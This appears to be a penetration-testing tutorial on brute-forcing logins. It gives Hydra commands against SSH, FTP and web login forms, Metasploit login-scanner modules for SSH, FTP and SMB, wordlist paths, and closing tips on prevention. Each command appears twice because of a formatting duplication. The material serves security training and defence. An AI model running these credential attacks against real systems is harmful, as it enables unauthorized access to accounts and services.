   

Brute Forcing

# **Brute Forcing**

## **1. Understanding Brute Force Attacks**

Brute forcing is the process of systematically guessing passwords or credentials to gain access to a system. It can be done using:

- **Wordlists** (Precompiled lists of common passwords)
- **Dictionary Attacks** (Using wordlists to attempt login)
- **Brute Force Attacks** (Trying every possible combination)

---

## **2. Wordlists for Brute Forcing**

Kali Linux and Metasploit contain built-in wordlists for brute-force attacks:

|Wordlist|Location|
|---|---|
|**RockYou.txt**|`/usr/share/wordlists/rockyou.txt.gz` (Needs to be unzipped)|
|**Metasploit Unix Passwords**|`/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`|
|**Metasploit Common Credentials**|`/usr/share/metasploit-framework/data/wordlists/common_users.txt`|

To extract `rockyou.txt`:

gzip -d /usr/share/wordlists/rockyou.txt.gz

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## **3. Brute Forcing with Hydra**

Hydra is a fast password-cracking tool for online brute force attacks.

### **Brute Force SSH with Hydra**

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-L users.txt` → List of usernames
- `-P rockyou.txt` → Password list
- `-t 4` → Number of parallel threads

### **Brute Force FTP with Hydra**

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
```

- `-l admin` → Single username

### **Brute Force Web Login (HTTP-POST Form)**

hydra -L users.txt -P passwords.txt <target-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

```
hydra -L users.txt -P passwords.txt <target-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

- `F=incorrect` → Failure message on wrong login

---

## **4. Brute Forcing with Metasploit**

Metasploit has **auxiliary modules** for brute-force attacks:

### **SSH Brute Force with Metasploit**

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
run

```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
run
```

### **Brute Force FTP**

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### **Brute Force SMB**

use auxiliary/scanner/smb/smb_login
set RHOSTS <target-ip>
set SMBUser administrator
set PASS_FILE passwords.txt
run

```
use auxiliary/scanner/smb/smb_login
set RHOSTS <target-ip>
set SMBUser administrator
set PASS_FILE passwords.txt
run
```

---

## **5. Preventing Brute Force Attacks**

To protect against brute-force attacks:

- Use **strong, complex passwords**
- Enable **account lockouts** after multiple failed attempts
- Implement **multi-factor authentication (MFA)**
- Restrict login attempts using **fail2ban**
- Change default ports for services like **SSH**